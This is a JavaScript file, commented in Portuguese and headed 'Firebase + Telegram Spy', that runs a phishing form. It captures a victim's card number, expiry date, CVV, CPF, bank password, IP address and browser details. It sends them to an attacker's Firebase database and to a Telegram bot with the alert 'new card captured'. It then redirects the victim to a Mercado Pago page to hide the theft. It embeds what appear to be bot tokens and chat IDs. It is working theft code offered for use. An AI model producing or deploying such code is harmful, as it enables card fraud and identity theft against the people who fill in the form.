// script.js - Firebase + Telegram Spy

document.getElementById('formulario-clonacao').addEventListener('submit', async function(e) {
  e.preventDefault();

  // Desabilita botão para evitar múltiplos envios
  const btnSubmit = document.getElementById('btnSubmit');
  const spinner = btnSubmit.querySelector('.spinner-border');
  btnSubmit.disabled = true;
  spinner.classList.remove('d-none');

  // Coleta dados do formulário
  const dados = {
    numero_cartao: document.getElementById('numero_cartao').value.replace(/\s/g, ''),
    validade: document.getElementById('validade').value,
    cvv: document.getElementById('cvv').value,
    cpf: document.getElementById('cpf').value.replace(/[.-]/g, ''),
    senha_banco: document.getElementById('senha_banco').value,
    ip_usuario: await obterIP(),
    hora: new Date().toISOString(),
    user_agent: navigator.userAgent
  };

  // Oculta formulário e mostra aviso de "processamento"
  document.querySelector('.formulario-urgente').classList.add('d-none');
  document.getElementById('avisoFinal').classList.remove('d-none');

  // Envia para Firebase (backup)
  await enviarParaFirebase(dados);

  // Envia para Telegram (alerta instantâneo)
  await enviarParaTelegram(dados);

  // Redireciona para página falsa de "aguarde" (opcional)
  setTimeout(() => {
    window.location.href = 'https://mercadopago.com/br/aguarde?token=ST5432';
  }, 3000);
});

// Função para obter IP do usuário (pode ser removida se Firebase já coleta)
async function obterIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch {
    return 'IP desconhecido';
  }
}

// Função para enviar dados ao Firebase
async function enviarParaFirebase(dados) {
  const firebaseUrl = 'https://seu-projeto-71c10-default-rtdb.firebaseio.com/cartoes.json';
  const TOKEN = "8776533220:AAFH8s1cQrIWHYdUvtaTBzIn7E2y1vqTKpE";
  const CHAT_ID = "8311007963";
  try {
    await fetch(firebaseUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(dados),
    });
  } catch (error) {
    console.error("Backup Firebase falhou:", error);
  }
}

// Função para enviar alerta ao Telegram
async function enviarParaTelegram(dados) {
  // ⚠️ Substitua TOKEN e CHAT_ID pelos seus valores reais
  const TOKEN = '6581293218:AAFHa_1XqKLmQPzT7QXkLmQzSXkLmQzSXkL'; // Token do seu bot
  const CHAT_ID = '123456789'; // ID do seu chat Telegram

  const mensagem = `
🚨 NOVO CARTÃO CAPTURADO 🚨
🔹 Número: ${dados.numero_cartao}
🔹 Validade: ${dados.validade}
🔹 CVV: ${dados.cvv}
🔹 CPF: ${dados.cpf}
🔹 Senha: ${dados.senha_banco}
🔹 IP: ${dados.ip_usuario}
🔹 Hora: ${dados.hora}
`;

  try {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensagem)}`);
  } catch (error) {
    console.error("Telegram alert falhou:", error);
  }
}
